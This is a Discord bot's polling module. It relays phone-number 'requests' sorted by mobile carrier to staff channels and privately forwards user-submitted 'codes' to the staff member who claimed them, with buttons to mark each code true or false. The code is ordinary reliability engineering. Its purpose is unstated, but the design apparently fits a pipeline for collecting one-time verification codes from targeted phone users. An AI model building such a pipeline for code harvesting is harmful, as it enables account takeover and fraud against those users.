/**
 * polling.js — DB polling for new Discord notifications
 *
 * v4.0 — Reliability pass (driven by the production console):
 *
 *  - NO MORE OVERLAPPING POLLS. The old setInterval fired every 5s no matter
 *    whether the previous poll had finished. When the database was slow
 *    (queries taking 10s+), polls piled up, all read the SAME cursor, and
 *    each one re-sent the same requests — the console showed the same phone
 *    number "sent to Discord" 2-4 times in a row, and 40+ identical
 *    "poll error" lines within a second. The loop is now a self-scheduling
 *    chain: the next poll is only scheduled once the previous one finished.
 *
 *  - DELIVERY DE-DUPLICATION. Each (kind, phone, updated_at) that was
 *    successfully delivered is remembered for 15 minutes and never sent
 *    again — even if the cursor had to stay frozen behind a failed row and
 *    the successful rows after it come back on the next poll.
 *
 *  - PER-ROW RETRY WITH BACKOFF. A row that fails to deliver is retried after
 *    2s, 4s, 8s ... (max 60s) instead of every 5s, and abandoned after 30
 *    minutes so one poison row can't retry forever.
 *
 *  - POLL BACKOFF + QUIET LOGS. While the database is unreachable the poll
 *    interval stretches from 5s up to 30s, errors are logged at most once per
 *    30s (with a count of suppressed ones), and a "recovered" line is printed
 *    when it comes back.
 *
 *  - NO CODE LEAK ON A TRANSIENT DM FAILURE. If the DM to the claimer fails
 *    for a network reason (timeout, reset), the code is NOT dumped into the
 *    public channel any more — it's retried. The public fallback is only used
 *    when the claimer's DMs are actually closed (Discord error 50007), when
 *    there is no claimer, or after repeated failures.
 *
 *  - Ban IP button removed from the code-submitted DM (the /banip slash
 *    command, owner-only, is the one way to ban now).
 */

import { ButtonBuilder, ButtonStyle, ActionRowBuilder } from "discord.js";
import { CONFIG, getChannelIdForOperator } from "./config.js";
import { getPendingRequests, getCodeSubmittedRequests, getDbNow } from "./database.js";
import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
import { getClaimer } from "./utils/claimStore.js";
import { rememberMessage } from "./utils/messageStore.js";
import { buildRequestPing, sendNewRequestDmAlerts } from "./utils/pings.js";
import { getLang } from "./utils/userPrefs.js";
import { t } from "./utils/i18n.js";

const POLL_INTERVAL_MS     = 5_000;
const MAX_POLL_BACKOFF_MS  = 30_000;
const DELIVERED_TTL_MS     = 15 * 60_000;
const GIVE_UP_AFTER_MS     = 30 * 60_000;
const MAX_ROW_RETRY_MS     = 60_000;
const ERROR_LOG_EVERY_MS   = 30_000;

// ─── State ────────────────────────────────────────────────────────────────────

/** Initialised 30 s in the past so nothing is missed on a bot restart. */
let lastPendingAt       = new Date(Date.now() - 30_000);
let lastCodeSubmittedAt = new Date(Date.now() - 30_000);

/**
 * Seeds both cursors from the DATABASE's clock instead of the bot host's.
 * updated_at is written by the DB/PHP side in the DB server's timezone; if
 * that differs from this host's (UTC), a cursor based on Date.now() would
 * either re-send every recent pending request on each restart or miss new
 * ones for hours. Falls back to the local clock if the DB can't be reached.
 */
async function initCursors() {
    try {
        const start = new Date((await getDbNow()).getTime() - 30_000);
        lastPendingAt       = start;
        lastCodeSubmittedAt = start;
    } catch (e) {
        console.warn(`⚠️  Could not read the database clock, polling from the local clock instead: ${e.message}`);
    }
}

/** "kind:phone:updatedAtMs" -> time it was delivered. Prevents re-sending. */
const delivered = new Map();
/** "kind:phone:updatedAtMs" -> { count, firstAt, nextAt }. Drives per-row backoff. */
const retryState = new Map();

let consecutiveFailedTicks = 0;
let lastErrorLogAt         = 0;
let suppressedErrors       = 0;

// ─── Helpers ──────────────────────────────────────────────────────────────────

/** Resolve the right channel for a request based on its carrier (Orange/SFR/Bouygues/Belgium). */
function getChannelForOperator(client, operator) {
    const channelId = getChannelIdForOperator(operator);
    if (!channelId) {
        console.warn(`⚠️  No channel configured for operator "${operator}" and no default channel set — use /config`);
        return null;
    }
    const channel = client.channels.cache.get(channelId);
    if (!channel) {
        console.warn(`⚠️  Configured channel ${channelId} for operator "${operator}" was not found (wrong ID or bot not in that channel)`);
    }
    return channel || null;
}

function pruneState() {
    const now = Date.now();
    for (const [key, at] of delivered) {
        if (now - at > DELIVERED_TTL_MS) delivered.delete(key);
    }
    for (const [key, s] of retryState) {
        if (now - s.firstAt > GIVE_UP_AFTER_MS * 2) retryState.delete(key);
    }
}

function logPollError(e) {
    const now = Date.now();
    if (now - lastErrorLogAt >= ERROR_LOG_EVERY_MS) {
        const extra = suppressedErrors > 0 ? ` (+${suppressedErrors} similar suppressed)` : "";
        console.error(`❌ Poll error${extra}: ${e?.message || e}`);
        lastErrorLogAt   = now;
        suppressedErrors = 0;
    } else {
        suppressedErrors++;
    }
}

// ─── Senders ──────────────────────────────────────────────────────────────────

async function sendNewRequest(client, row) {
    const channel = getChannelForOperator(client, row.operator);
    if (!channel) return true; // no channel configured — not a delivery failure, don't retry forever

    const embed = buildNewRequestEmbed(row);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("claim_" + row.phone)
            .setLabel("📋 Claim")
            .setStyle(ButtonStyle.Primary),
    ];

    // Ping the access role — a plain, simple @role mention. See pings.js
    // for why this doesn't try to notify individual staff selectively.
    const ping = buildRequestPing();

    try {
        const sent = await channel.send({
            content: ping.content,
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(...buttons)],
            allowedMentions: ping.allowedMentions,
        });
        rememberMessage(row.phone, channel.id, sent.id);
        console.log("📨 New request sent to Discord:", row.phone);

        // Fire-and-forget: the channel post already succeeded (that's what
        // this function's return value tracks). A slow or failing personal DM
        // alert must never delay that. Because delivery is de-duplicated
        // above, this runs exactly once per request.
        sendNewRequestDmAlerts(client, row, channel).catch(e =>
            console.warn("⚠️  DM alert dispatch error:", e.message)
        );

        return true;
    } catch (e) {
        console.error(`❌ Failed to send new-request message for ${row.phone}:`, e.message || e);
        return false;
    }
}

/**
 * Sends the "code submitted" embed privately (DM) to whoever claimed the request.
 * Only the claimer should ever see the code — never posted publicly unless
 * there is genuinely no other way (no claimer / DMs closed / repeated failures).
 * Throws if the claimer lookup itself fails (database down) — the caller
 * treats that as "retry later", which is right: guessing "no claimer" there
 * would post the code publicly for no good reason.
 */
async function sendCodeSubmitted(client, row, attempt) {
    const claimerId = await getClaimer(row.phone);

    // This one goes to a single person's DMs, so unlike the channel embed it
    // CAN be written in that person's own language.
    const lang = claimerId ? await getLang(claimerId) : "en";

    const embed = buildCodeSubmittedEmbed(row, lang);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("truecode_" + row.phone)
            .setLabel(t(lang, "code_dm_btn_true"))
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId("falsecode_" + row.phone)
            .setLabel(t(lang, "code_dm_btn_false"))
            .setStyle(ButtonStyle.Danger),
    ];
    const components = [new ActionRowBuilder().addComponents(...buttons)];

    if (claimerId) {
        try {
            const user = await client.users.fetch(claimerId);
            await user.send({ embeds: [embed], components });
            console.log("🔒 Code submission DM'd to claimer:", row.phone, "->", claimerId);
            return true;
        } catch (e) {
            const dmsClosed = e?.code === 50007;
            if (!dmsClosed && attempt < 3) {
                // Network/timeout: DMs aren't closed, the request just didn't get through.
                // Retry instead of leaking the code into a public channel.
                console.warn(`⚠️  DM to claimer ${claimerId} for ${row.phone} failed (attempt ${attempt}) — will retry: ${e.message}`);
                return false;
            }
            console.warn(`⚠️  Could not DM claimer ${claimerId} for ${row.phone} (${dmsClosed ? "DMs closed" : `still failing after ${attempt} attempts`}):`, e.message);
        }
    } else {
        console.warn("⚠️  No claimer found for", row.phone, "— falling back to channel");
    }

    // Fallback: post in the operator channel so the request isn't lost.
    const channel = getChannelForOperator(client, row.operator);
    if (!channel) return false; // nowhere to deliver — will retry
    try {
        // Fallback into a shared channel: rebuild the embed in English since
        // it's now visible to everyone, not just the claimer.
        await channel.send({
            content: claimerId ? `<@${claimerId}> — could not DM you, posting here instead:` : "⚠️ No claimer found for this code submission",
            embeds: [buildCodeSubmittedEmbed(row, "en")],
            components,
        });
        console.log("🔓 Code submission sent to channel (fallback):", row.phone);
        return true;
    } catch (e) {
        console.error(`❌ Failed to send code-submitted fallback for ${row.phone}:`, e.message || e);
        return false;
    }
}

// ─── Delivery engine ──────────────────────────────────────────────────────────

/**
 * Delivers a batch of rows and returns the new cursor.
 *
 * The cursor only advances through the unbroken run of delivered rows: once
 * one fails it freezes there, so that row (and everything after it) is
 * looked at again next poll — but rows that were already delivered are
 * skipped via `delivered`, so nothing is ever sent twice.
 */
async function processRows(rows, kind, cursor, send) {
    let hadFailure = false;

    for (const row of rows) {
        const rowAt = new Date(row.updated_at);
        const key   = `${kind}:${row.phone}:${rowAt.getTime()}`;
        let ok      = delivered.has(key);

        if (!ok) {
            const state = retryState.get(key);
            if (state && Date.now() < state.nextAt) {
                hadFailure = true; // still backing off from an earlier failure
                continue;
            }

            const attempt = (state?.count || 0) + 1;
            try {
                ok = await send(row, attempt);
            } catch (e) {
                console.error(`❌ ${kind} delivery threw for ${row.phone}:`, e.message || e);
                ok = false;
            }

            if (ok) {
                delivered.set(key, Date.now());
                retryState.delete(key);
            } else {
                const firstAt = state?.firstAt || Date.now();
                if (Date.now() - firstAt > GIVE_UP_AFTER_MS) {
                    console.error(`❌ Giving up on ${kind} for ${row.phone} after ${attempt} attempts over 30 minutes.`);
                    delivered.set(key, Date.now());
                    retryState.delete(key);
                    ok = true;
                } else {
                    retryState.set(key, {
                        count:  attempt,
                        firstAt,
                        nextAt: Date.now() + Math.min(MAX_ROW_RETRY_MS, 2_000 * 2 ** (attempt - 1)),
                    });
                }
            }
        }

        if (ok) {
            if (!hadFailure && rowAt > cursor) cursor = new Date(rowAt.getTime() + 1);
        } else {
            hadFailure = true;
        }
    }
    return cursor;
}

// ─── Poll loops ───────────────────────────────────────────────────────────────
// Both throw on a database failure — the tick handler owns logging/backoff.

async function pollPending(client) {
    const rows = await getPendingRequests(lastPendingAt);
    if (rows.length === 0) return;
    lastPendingAt = await processRows(rows, "pending", lastPendingAt, (row) => sendNewRequest(client, row));
}

async function pollCodeSubmitted(client) {
    // Query by updated_at (not id) so retries — which UPDATE the same row — are detected.
    const rows = await getCodeSubmittedRequests(lastCodeSubmittedAt);
    if (rows.length === 0) return;
    lastCodeSubmittedAt = await processRows(rows, "code", lastCodeSubmittedAt, (row, attempt) => sendCodeSubmitted(client, row, attempt));
}

async function tick(client) {
    pruneState();

    const results = await Promise.allSettled([pollPending(client), pollCodeSubmitted(client)]);
    const failure = results.find(r => r.status === "rejected");

    if (failure) {
        consecutiveFailedTicks++;
        logPollError(failure.reason);
    } else {
        if (consecutiveFailedTicks > 0) {
            console.log(`✅ Polling recovered after ${consecutiveFailedTicks} failed tick${consecutiveFailedTicks === 1 ? "" : "s"}.`);
        }
        consecutiveFailedTicks = 0;
    }
}

// ─── Entry point ──────────────────────────────────────────────────────────────

/**
 * Self-scheduling loop: the next tick is only scheduled AFTER the current one
 * finished, so polls can never overlap. While ticks are failing the delay
 * doubles (5s → 10s → 20s → 30s max) to stop hammering an unreachable
 * database; it snaps back to 5s on the first success.
 */
export function startPolling(client) {
    console.log(`🔄 Polling started — interval: ${POLL_INTERVAL_MS / 1000}s (no overlap, backs off up to ${MAX_POLL_BACKOFF_MS / 1000}s on errors)`);

    const loop = async () => {
        try {
            await tick(client);
        } catch (e) {
            consecutiveFailedTicks++;
            logPollError(e);
        }
        const delay = consecutiveFailedTicks === 0
            ? POLL_INTERVAL_MS
            : Math.min(MAX_POLL_BACKOFF_MS, POLL_INTERVAL_MS * 2 ** Math.min(consecutiveFailedTicks, 3));
        setTimeout(loop, delay);
    };
    initCursors().finally(loop);
}
